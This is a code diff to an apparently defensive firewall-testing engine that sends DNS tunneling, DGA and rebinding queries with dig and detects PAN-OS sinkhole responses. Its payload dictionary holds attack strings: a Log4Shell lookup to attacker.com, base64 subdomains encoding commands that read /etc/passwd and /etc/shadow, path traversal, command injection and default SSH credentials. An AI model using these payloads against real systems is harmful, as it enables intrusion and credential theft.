@@ -299,10 +299,10 @@ ATTACK_PAYLOADS = {
     'cmdi_backtick': '`id`',
     'path_traversal': '../../../../etc/passwd',
     'log4shell': '${jndi:ldap://attacker.com/exploit}',
-    # DNS Attacks
-    'dns_tunnel': 'dnscat.aW1wb3J0IG9zO29zLnN5c3RlbSgiY2F0IC9ldGMvcGFzc3dkIik.tunnel.example.com',
-    'dns_dga': 'xkqrtvwzmjfhglpnds.com|bvycxqwrtmjnhkgfdp.net|zlkxjwrmqnvghftdps.org',
-    'dns_rebind': 'rebind-127.0.0.1-169.254.169.254.example.com',
+    # DNS Attacks — multiple queries per test for better detection
+    'dns_tunnel': 'aW1wb3J0IG9zO29zLnN5c3RlbSgiY2F0IC9ldGMvcGFzc3dkIik.dnscat.attacker.example.com|Y2F0IC9ldGMvc2hhZG93IHwgYmFzZTY0IC1kID4gL3RtcC9vdXQ.t1.tunnel.example.com|c3lzdGVtaW5mbyB8IGJhc2U2NCAtdyAwID4gL3RtcC9zeXNpbmZv.t2.tunnel.example.com|bmV0c3RhdCAtdGxucCB8IGJhc2U2NA.data.tunnel.example.com|d2hvYW1pICYmIGhvc3RuYW1lICYmIGlkIC1h.exfil.tunnel.example.com',
+    'dns_dga': 'xkqrtvwzmjfhglpnds.com|bvycxqwrtmjnhkgfdp.net|zlkxjwrmqnvghftdps.org|qwmxhrtknvgzfplds.biz|jfkdlsqpwmxzrvhng.info|plnhgfwxqzmkrtdvs.cc|rvtxwqzjmhkgpndfs.top',
+    'dns_rebind': 'rebind-127-0-0-1.attacker.example.com',
     # Protocol Abuse
     'ssh_bruteforce': 'admin:password|root:toor|admin:admin123|root:root|test:test123',
     'ftp_bounce': 'PORT 192,168,1,1,0,80',
@@ -943,92 +943,164 @@ class SecurityTestEngine:
             return self._blocked_result(test, f'Connection blocked: {e}',
                 url=url, method='GET', sent_payload=payload)
 
+    # PAN-OS DNS sinkhole IPs — when Anti-Spyware sinkholes a query,
+    # it replaces the answer with one of these IPs instead of dropping it
+    SINKHOLE_IPS = {
+        '72.5.65.111',       # PAN-OS default sinkhole IPv4
+        '::1',               # PAN-OS default sinkhole IPv6
+        '127.0.0.1',         # Common custom sinkhole
+        '0.0.0.0',           # Null sinkhole
+        'sinkhole.paloaltonetworks.com',
+    }
+
+    def _parse_dig_answer_ip(self, dig_output: str) -> str:
+        """Extract the resolved IP from dig ANSWER SECTION."""
+        in_answer = False
+        for line in dig_output.split('\n'):
+            if 'ANSWER SECTION' in line:
+                in_answer = True
+                continue
+            if in_answer and line.strip():
+                if line.startswith(';') or not line.strip():
+                    break
+                parts = line.split()
+                if len(parts) >= 5 and parts[3] == 'A':
+                    return parts[4]
+                break
+        return ''
+
+    def _is_sinkholed(self, dig_output: str) -> bool:
+        """Check if DNS response was sinkholed by firewall."""
+        ip = self._parse_dig_answer_ip(dig_output)
+        return ip in self.SINKHOLE_IPS
+
+    def _dns_query(self, host: str, domain: str, qtype: str = 'A',
+                   timeout: int = 5) -> tuple:
+        """Run dig query, return (output, blocked, sinkholed, error)."""
+        try:
+            result = subprocess.run(
+                ['dig', f'@{host}', domain, qtype, f'+time={timeout}', '+tries=1', '+short'],
+                capture_output=True, text=True, timeout=timeout + 5)
+            output = result.stdout + result.stderr
+
+            # Also run verbose version for sinkhole detection
+            result_v = subprocess.run(
+                ['dig', f'@{host}', domain, qtype, f'+time={timeout}', '+tries=1'],
+                capture_output=True, text=True, timeout=timeout + 5)
+            output_full = result_v.stdout + result_v.stderr
+
+            if result.returncode != 0:
+                return output_full, True, False, None
+            if 'connection timed out' in output.lower() or 'no servers could be reached' in output.lower():
+                return output_full, True, False, None
+            if 'REFUSED' in output_full:
+                return output_full, True, False, None
+            if self._is_sinkholed(output_full):
+                return output_full, False, True, None
+            return output_full, False, False, None
+        except subprocess.TimeoutExpired:
+            return '', True, False, None
+        except Exception as e:
+            return '', False, False, e
+
     def _test_dns_attack(self, test: SecurityTestCase, host: str) -> SecurityTestResult:
         """Test DNS-based attacks using dig."""
         payload = ATTACK_PAYLOADS.get(test.id, '')
 
         if test.id == 'dns_tunnel':
-            # Send DNS query with suspiciously long encoded subdomain
-            domain = payload
-            try:
-                result = subprocess.run(
-                    ['dig', f'@{host}', domain, 'A', '+time=5', '+tries=1'],
-                    capture_output=True, text=True, timeout=10)
-                output = result.stdout + result.stderr
-                if result.returncode != 0 or 'connection timed out' in output.lower() or 'no servers could be reached' in output.lower():
-                    return self._blocked_result(test,
-                        'DNS query timed out or refused — likely blocked by firewall',
-                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
-                if 'ANSWER SECTION' in output:
-                    return self._passthrough_result(test, 0,
-                        'DNS tunnel query resolved — not blocked',
-                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            # Send multiple DNS tunnel queries with long encoded subdomains
+            domains = payload.split('|')
+            blocked = 0
+            sinkholed = 0
+            total = 0
+            all_output = []
+            for domain in domains:
+                domain = domain.strip()
+                if not domain:
+                    continue
+                total += 1
+                # Query TXT record too (common in DNS tunneling)
+                for qtype in ['A', 'TXT']:
+                    output, is_blocked, is_sink, err = self._dns_query(host, domain, qtype, timeout=5)
+                    all_output.append(f'{qtype} {domain}: {"BLOCKED" if is_blocked else "SINKHOLED" if is_sink else "RESOLVED"}')
+                    if is_blocked:
+                        blocked += 1
+                        break
+                    if is_sink:
+                        sinkholed += 1
+                        break
+                time.sleep(0.1)  # Rapid queries
+
+            detail_log = '; '.join(all_output[:5])
+            if blocked > 0 or sinkholed > 0:
+                action = []
+                if blocked: action.append(f'{blocked} blocked/dropped')
+                if sinkholed: action.append(f'{sinkholed} sinkholed')
                 return self._blocked_result(test,
-                    'DNS query returned no answer — likely blocked',
-                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
-            except subprocess.TimeoutExpired:
-                return self._blocked_result(test, 'DNS query timed out — blocked by firewall',
-                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
-            except Exception as e:
-                return self._error_result(test, str(e),
-                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+                    f'DNS tunneling detected: {", ".join(action)} of {total} queries. {detail_log}',
+                    url=f'dig @{host} [tunnel queries]', method='DNS', sent_payload=payload)
+            return self._passthrough_result(test, 0,
+                f'All {total} DNS tunnel queries resolved — not blocked. {detail_log}',
+                url=f'dig @{host} [tunnel queries]', method='DNS', sent_payload=payload)
 
         elif test.id == 'dns_dga':
             # Query multiple DGA-like domains
             domains = payload.split('|')
             blocked_count = 0
+            sinkholed_count = 0
             resolved_count = 0
+            all_output = []
             for domain in domains:
-                try:
-                    result = subprocess.run(
-                        ['dig', f'@{host}', domain.strip(), 'A', '+time=3', '+tries=1'],
-                        capture_output=True, text=True, timeout=8)
-                    output = result.stdout + result.stderr
-                    if result.returncode != 0 or 'connection timed out' in output.lower() or 'SERVFAIL' in output:
-                        blocked_count += 1
-                    elif 'ANSWER SECTION' in output:
-                        resolved_count += 1
-                    else:
-                        blocked_count += 1
-                except (subprocess.TimeoutExpired, Exception):
+                domain = domain.strip()
+                if not domain:
+                    continue
+                output, is_blocked, is_sink, err = self._dns_query(host, domain, 'A', timeout=3)
+                if is_blocked:
                     blocked_count += 1
-            if blocked_count >= len(domains):
+                    all_output.append(f'{domain}: BLOCKED')
+                elif is_sink:
+                    sinkholed_count += 1
+                    all_output.append(f'{domain}: SINKHOLED')
+                else:
+                    resolved_count += 1
+                    ip = self._parse_dig_answer_ip(output)
+                    all_output.append(f'{domain}: RESOLVED ({ip})')
+                time.sleep(0.1)
+
+            detail_log = '; '.join(all_output)
+            total_blocked = blocked_count + sinkholed_count
+            if total_blocked >= len(domains):
                 return self._blocked_result(test,
-                    f'All {len(domains)} DGA domains blocked/refused',
+                    f'All {len(domains)} DGA domains blocked/sinkholed. {detail_log}',
                     url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
-            elif blocked_count > 0:
+            elif total_blocked > 0:
                 return self._blocked_result(test,
-                    f'{blocked_count}/{len(domains)} DGA domains blocked',
+                    f'{total_blocked}/{len(domains)} DGA domains blocked. {detail_log}',
                     url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
             return self._passthrough_result(test, 0,
-                f'All {resolved_count} DGA domains resolved — not blocked',
+                f'All {resolved_count} DGA domains resolved — not blocked. {detail_log}',
                 url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
 
         elif test.id == 'dns_rebind':
             # Query domain that could resolve to private IPs
             domain = payload
-            try:
-                result = subprocess.run(
-                    ['dig', f'@{host}', domain, 'A', '+time=5', '+tries=1'],
-                    capture_output=True, text=True, timeout=10)
-                output = result.stdout + result.stderr
-                if result.returncode != 0 or 'connection timed out' in output.lower():
-                    return self._blocked_result(test,
-                        'DNS rebinding query blocked/refused',
-                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
-                if 'ANSWER SECTION' in output:
-                    return self._passthrough_result(test, 0,
-                        'DNS rebinding domain resolved — not blocked',
-                        url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            output, is_blocked, is_sink, err = self._dns_query(host, domain, 'A', timeout=5)
+            if err:
+                return self._error_result(test, str(err),
+                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            if is_blocked:
                 return self._blocked_result(test,
-                    'No answer for rebinding domain — blocked',
+                    'DNS rebinding query blocked/refused by firewall',
                     url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
-            except subprocess.TimeoutExpired:
-                return self._blocked_result(test, 'DNS query timed out — blocked',
+            if is_sink:
+                ip = self._parse_dig_answer_ip(output)
+                return self._blocked_result(test,
+                    f'DNS rebinding query sinkholed (resolved to {ip})',
                     url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
-            except Exception as e:
-                return self._error_result(test, str(e),
-                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
+            ip = self._parse_dig_answer_ip(output)
+            return self._passthrough_result(test, 0,
+                f'DNS rebinding domain resolved to {ip} — not blocked',
+                url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
 
         return self._error_result(test, f'Unknown DNS test: {test.id}')
 
